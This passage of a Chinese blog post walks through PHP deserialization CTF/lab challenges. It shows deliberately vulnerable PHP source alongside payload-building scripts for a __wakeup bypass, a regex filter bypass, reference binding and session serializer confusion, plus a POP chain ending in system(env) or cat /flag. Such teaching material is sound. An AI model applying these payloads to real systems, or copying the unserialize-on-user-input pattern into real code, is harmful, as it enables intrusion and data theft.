<li><em>在 <code>__set</code> 中，首先检查 <code>$fox</code>（即 <code>obj2-&gt;Fox</code>）是否不是 <code>All_in_one</code> 的实例，并且调用 <code>$fox()</code> 返回字符串 “summer”。这里 <code>$fox</code> 是数组 <code>[&quot;summer&quot;, &quot;find_myself&quot;]</code>，调用它返回 “summer”，条件满足。</em></li>
<li>这实际上是把”$fox”当成一个函数调用，然后判断它的返回值是不是”summer”。所以 __set 这一块的逻辑：如果Fox 不是 All_in_one 对象，并且Fox 作为函数执行后，返回 “summer”，那么执行；</li>
<li>但是这里$fox()赋值为数组（不会触发__invoke())，然后也不属于这个类，然后要求执行之后返回内容是summer，全文的summer是放在一个静态方法里的，就是下面的<code>find_myself</code>里，要给一个$fox到这个数组</li>
<li>all_in_one里的$fox是一个实例，并不是数组，所以赋值为数组之后就不属于这个类了</li>
</ul>
</li>
<li><p>后面的<code>$a</code>也会触发<code>__invoke()</code>，但是前面还有个<code>__tostring()</code>魔术方法，调用是把对象转为字符串的时候，也许可以直接交一个变量然后赋值触发？</p>
</li>
<li><p>回到if判断下方，执行 <code>$komiko-&gt;Eureka($this-&gt;L, $this-&gt;sleep3r)</code>，Eureka方法没有定义，触发<code>__call</code></p>
</li>
<li><p>把<code>$args[0]</code>就当成一个普通变量，管<code>$arg[1]</code>的值干什么，是直接输出的</p>
</li>
<li><p><code>echo $args[1]</code>;是返回值给sleep3r了吗？</p>
</li>
<li><p>这里<code>__call</code>里变量其实提交了两个，就像是C语言的函数调用一样，两个变量分别去对应<code>$this-&gt;L</code>和<code>$this-&gt;sleep3r</code>，所以实际上需要做赋值处理的就是看参数<code>$args[0]</code>对应的即 <code>$this-&gt;L</code>，值为 “1e4”的长度是否小于4且加1后大于10000，这是判断条件</p>
</li>
<li><p>输出的是<code>$arg[1]</code>，对应的变量就是<code>$this-&gt;sleep3r</code>，这里把变量当成字符串输出就会触发<code>__toString</code></p>
</li>
<li><p><code>__toString</code> 中，执行 <code>$a = $this-&gt;_4ak5ra; $a();</code>，调用<code>__invoke()</code></p>
</li>
<li><p><code>__invoke</code> 中，执行 <code>$f($arg)</code>，赋值就给要执行的命令，目的是要flag，就去呈现目录，要的就是system(env)</p>
</li>
<li><p>关于<code>__invoke()</code>中<code>$f($arg)</code>会不会触发<code>__invoke()</code>从而陷入循环的问题：</p>
<p>这里把<code>$f</code>和<code>$arg</code>都赋值成一个字符串了，并不是变量，所以不会循环触发</p>
</li>
<li><p>使用的指令（需要进行筛选）</p>
<p>cat&#x2F;flag（或者加上其他flag文件地址之类的）或者env（当flag存在于环境变量）</p>
</li>
<li><p>最后注意：提交的内容是get方式交到url上，所以还需要在序列化之后url编码</p>
</li>
</ol>
<h2 id="PHP反序列化靶场"><a href="#PHP反序列化靶场" class="headerlink" title="PHP反序列化靶场"></a>PHP反序列化靶场</h2><h3 id="un-1"><a href="#un-1" class="headerlink" title="un-1"></a>un-1</h3><div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class SoFun&#123; </span><br><span class="line">  protected $file=&#x27;index.php&#x27;;</span><br><span class="line">  function __destruct()&#123; </span><br><span class="line">    if(!empty($this-&gt;file)) &#123;</span><br><span class="line">      if(strchr($this-&gt; file,&quot;\\&quot;)===false &amp;&amp;  strchr($this-&gt;file, &#x27;/&#x27;)===false)</span><br><span class="line">        show_source(dirname (__FILE__).&#x27;/&#x27;.$this -&gt;file);</span><br><span class="line">      else</span><br><span class="line">        die(&#x27;Wrong filename.&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;  </span><br><span class="line">  function __wakeup()&#123;</span><br><span class="line">   $this-&gt; file=&#x27;index.php&#x27;;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">if (!isset($_GET[&#x27;tryhackme&#x27;]))&#123; </span><br><span class="line">  show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">else&#123; </span><br><span class="line">  $a=$_GET[&#x27;tryhackme&#x27;]; </span><br><span class="line">  echo $a;</span><br><span class="line">  unserialize($a); </span><br><span class="line">&#125;</span><br><span class="line"> ?&gt;&lt;!--key in flag1.php--&gt;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p><strong>前置知识：</strong></p>
<p><code>__wakeup()</code>：在对象被反序列化 (unserialize) 之后调用，用于重新初始化对象资源（如数据库连接），常用于数据准备或清理，是处理对象持久化状态的关键。 </p>
<p><code>__destruct()</code>：对象销毁时自动执行，destruct可以在脚本清除数据之前做到对数据的保存（转移到另一个文件里），也可以在清理前执行关闭文件之类的，使数据被正确释放</p>
<p><code>empty()</code>：检查是否为空，如果为空则返回TRUE；反之则FALSE;</p>
<p><code>isset()</code>：检查是否存在，如果存在则返回TRUE；反之则FALSE；</p>
<p><code>strchr()</code>：也许这里可以类比C语言，就是检查是否有与search项匹配的部分，因此需要知道strchr的结构</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">strchr</span>(<span class="keyword">string</span>,search,before_search);</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>这里的<code>string</code>和<code>search</code>是必须的，<code>before_search</code>默认FALSE，如果是是TRUE那么会返回search的参数第一次出现的字符串部分。</p>
<p><code>dirname(path)</code>：参数path是一个包含有指向一个文件的全路径的字符串</p>
<ul>
<li>类名：SoFun</li>
<li>变量：file，protected属性</li>
<li>注入点：GET变量tryhackme，这是payload的地方</li>
</ul>
<p>先触发<code>__destruct()</code></p>
<p>魔术方法触发会让变量被重置，并且由于最后一步是反序列化，所以不能直接避免执行，而是要让它无法执行，让它失效，不满足被执行的原理</p>
<p>当反序列化字符串中声明的对象属性数量大于实际属性数量时，__wakeup()+会被跳过。</p>
<p>所以这里构建两个变量，然后再进行编码</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$file</span>=<span class="string">&#x27;flag1.php&#x27;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">SoFun</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>还是有相对路径的问题</p>
<p><img   lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260130171337904.png"  alt="image-20260130171337904"></p>
<p>Linux默认<code>/</code></p>
<p>所以直接在windows本地的就失败了</p>
<h3 id="un-2"><a href="#un-2" class="headerlink" title="un-2"></a>un-2</h3><div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag2.php&quot;</span>; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funny</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;tryhackme&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;tryhackme&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;NONONO!&quot;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



<p><code>preg_match()</code>：preg_match — 执行匹配正则表达式</p>
<p><code>show_source()</code>：show_source — 别名 highlight_file() — 语法高亮一个文件，打印输出或者返回 <code>filename</code> 文件中语法高亮版本的代码</p>
<p>序列化的结构被过滤也就是：和数字直接连接的结果都会被处理，所以如果没有连接数字就可以</p>
<p>本体比想象的少，这里对序列化内容做url编码之后还会被过滤掉所以需要处理之后再url</p>
<p>所以就是先序列化再处理防止被匹配，再url编码（防止特殊符号）</p>
<p>可以用<code>+5</code>或者<code>5e0</code>代替<code>5</code></p>
<p>前面部分，类中没有设置变量，所以就不需要在重申类的时候写变量，</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Funny</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Funny</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>之后替换，再编码</p>
<h3 id="un-3"><a href="#un-3" class="headerlink" title="un-3"></a>un-3</h3><div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag3.php&quot;</span>; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funny</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$verify</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$nobodyknow</span>;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;password = <span class="variable">$nobodyknow</span>;<span class="comment">//将 $nobodyknow 赋值给 $this-&gt;password</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password === <span class="variable language_">$this</span>-&gt;verify)&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;你不太行啊??!&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;tryhackme&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;tryhackme&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>因为存在比较，所以一定会使用已经存在的内容这里需要函数？</p>
<p>变量password和verify全等，所以需要相同赋值，但是不能直接赋值</p>
<p>等一下这里global变量都是未定义的（定义应该是访问权限之类的内容）</p>
<p>类的内部共享同一个属性，所以一开始的时候password和verify是一个值，但是之后对password赋值了，这个时候就不再满足全等，所以这里的方式是将他们绑定为引用关系，这个时候就算改变了也没有影响</p>
<p><strong>主逻辑</strong>：</p>
<ul>
<li>如果 GET 参数 <code>tryhackme</code> 存在，则反序列化它</li>
<li>否则显示源码（所以show_source的那个FILE根本不指五我们需要的文件而是</li>
</ul>
<p>好吧他的意思就是前面两个全局变量就是未知的，有可能来自一开始包含的这个文件，所以假设为多少也好，假设为空也好，实际上就是相当于两个变量都是未知的</p>
<p>这里的两个全局变量在flag3.php里被定义申明之类的，所以才能有后来的echo的flag</p>
<p>建立引用关系(函数)，注意不要漏了函数访问限制的判定</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Funny</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$verify</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">yep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password =&amp; <span class="variable">$nobodyknow</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Funny</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;<span class="title function_ invoke__">yep</span>();<span class="comment">//记得调用引用关系</span></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



<h3 id="un-4"><a href="#un-4" class="headerlink" title="un-4"></a>un-4</h3><div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// goto un42.php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;tryhackme&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;tryhackme&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;tryhackme&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<h4 id="un-42"><a href="#un-42" class="headerlink" title="un-42"></a>un-42</h4><div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag4.php&quot;</span>; </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);<span class="comment">//设置了 PHP 的 session 序列化处理器为 php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();  <span class="comment">// 开始 session，会反序列化 session 数据</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funny</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<ul>
<li><p><code>ini_set</code> 函数详细介绍</p>
<p><code> ini_set</code> 是 PHP 的一个内置函数，用于在脚本运行时临时修改 <code>php.ini</code> 配置选项。它能即时生效，但仅在当前脚本执行期间有效，脚本结束后设置会自动失效。通过 <code>ini_set(&quot;选项&quot;, &quot;新值&quot;)</code> 的方式，无需重启服务器即可灵活调整参数。</p>
<p>功能： 设置指定配置选项的值。该选项会在脚本运行时生效，脚本结束后恢复。</p>
<p>语法： <code>string ini_set ( string $varname , string $newvalue )</code></p>
<p>返回值： 成功时返回旧值，失败时返回 false。</p>
<p>作用域： 仅在当前脚本运行周期内有效。</p>
</li>
</ul>
<p>会话赋值：如果传入<code>tryhackme</code> 参数，会将其值存入<code>$_SESSION[&#39;tryhackme&#39;]</code>中；否则显示当前代码。PHP 会话序列化漏洞的核心是：当存储会话数据和读取会话数据时使用不同的序列化处理器，可能导致恶意数据被反序列化执行。</p>
<p> <code>ini_set()</code> 设置 PHP 的会话序列化处理器为<code>php_serialize</code>，会话数据将以 PHP 的默认序列化格式进行存储 GET 变量 <code>tryhackme</code> 的值存储到 $_SESSION 数组中，这个数组最终被序列化 Session：服务器用来存储用户会话状态（比如登录状态、用户 ID、购物车信息）的机制，避免每次请求都重新验证用户</p>
<p><strong>序列化处理器是什么？</strong></p>
